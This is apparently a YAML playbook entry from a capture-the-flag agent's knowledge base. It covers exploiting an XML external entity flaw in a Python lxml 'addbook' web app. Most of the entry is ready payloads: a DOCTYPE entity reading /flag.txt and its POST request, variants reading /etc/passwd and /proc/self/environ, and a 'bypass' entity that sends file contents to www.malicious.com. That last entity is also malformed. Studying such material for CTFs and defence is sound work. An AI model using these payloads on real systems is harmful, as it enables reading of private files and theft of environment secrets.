name: xxe_lxml_etree_file_read
category: web
tags: [xxe, xml, lxml, etree, file_read, external_entity]
indicators:
  - "lxml.etree XML parsing"
  - "XMLParser with resolve_entities=True"
  - "XMLParser with no_network=False"
  - "User-controlled XML input"
  - "etree.fromstring() with user input"
  - "Book/ISBN XML format"

tricks:
  - name: "Step 1: Identify XXE vulnerability"
    when: "Found XML parsing with user input"
    how: "Check XMLParser configuration and entity resolution"
    payload: |
      # py line 21:
      # parser = etree.XMLParser(no_network=False,resolve_entities=True)
      #
      # Vulnerability indicators:
      # - resolve_entities=True: Allows external entity resolution
      # - no_network=False: Allows network access for external entities
      # - User input directly passed to etree.fromstring() (line 23)
      # - No validation or sanitization of XML input
      #
      # This configuration allows XXE attacks to read local files

  - name: "Step 2: Craft XXE payload"
    when: "Confirmed XXE vulnerability"
    how: "Create XML with external entity pointing to flag file"
    payload: |
      # Basic XXE payload structure:
      <?xml version="1.0"?>
      <!DOCTYPE Book [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
      ]>
      <Book>
          <Title>Test Book</Title>
          <ISBN>&xxe;</ISBN>
          <Editor>Test Editor</Editor>
          <Publisher>Test Publisher</Publisher>
      </Book>
      #
      # Explanation:
      # - DOCTYPE defines an external entity named "xxe"
      # - SYSTEM "file:///flag.txt" points to the flag file
      # - &xxe; references the entity, injecting file content
      # - Content appears in the ISBN field (or any field)

  - name: "Step 3: Send XXE payload"
    when: "Payload ready"
    how: "POST to /addbook endpoint with XXE payload in xml parameter"
    payload: |
      POST /addbook
      Content-Type: application/x-www-form-urlencoded
      xml=<?xml version="1.0"?>
      <!DOCTYPE Book [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
      ]>
      <Book>
          <Title>Test</Title>
          <ISBN>&xxe;</ISBN>
      </Book>
      #
      # The application:
      # 1. Receives XML in request.form['xml']
      # 2. Creates parser with resolve_entities=True
      # 3. Parses XML with etree.fromstring()
      # 4. External entity is resolved, file content injected
      # 5. Parsed XML is returned in response (line 31)

  - name: "Step 4: Extract flag from response"
    when: "XXE payload executed"
    how: "Check parsed XML output for flag"
    payload: |
      # Response structure (result.html):
      # - msg: "You have append this book successfully !"
      # - parsed_xml: The parsed XML with injected file content
      #
      # Flag extraction:
      # 1. Flag appears in the parsed XML output
      # 2. Usually in the ISBN field (where &xxe; was placed)
      # 3. Use regex to extract: FLAG\{[^}]+\}
      #
      # Example Python extraction:
      # import re
      # flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
      # if flag_match:
      #     flag = flag_match.group(0)
      #
      # Note: Flag file location: /flag.txt (created in Dockerfile)

  - name: "Alternative: Read other files"
    when: "Need to read other files"
    how: "Modify SYSTEM path in XXE payload"
    payload: |
      # Read different files:
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
      <!ENTITY xxe SYSTEM "file:///app/py">
      <!ENTITY xxe SYSTEM "file:///proc/self/environ">
      #
      # Note: file:// protocol for local files
      # For network resources: http://, ftp://, etc.

  - name: "Bypass techniques"
    when: "Basic XXE blocked or filtered"
    how: "Use alternative XXE techniques"
    payload: |
      # Method 1: Use parameter entities (if DOCTYPE allows)
      <!DOCTYPE Book [
      <!ENTITY % xxe SYSTEM "file:///flag.txt">
      <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
      ]>
      #
      # Method 2: Use CDATA wrapper (if needed)
      <!ENTITY xxe SYSTEM "file:///flag.txt">
      <ISBN><![CDATA[&xxe;]]></ISBN>
      #
      # Method 3: Try different file paths
      file:///flag.txt
      file:///app/flag.txt
      file://flag.txt
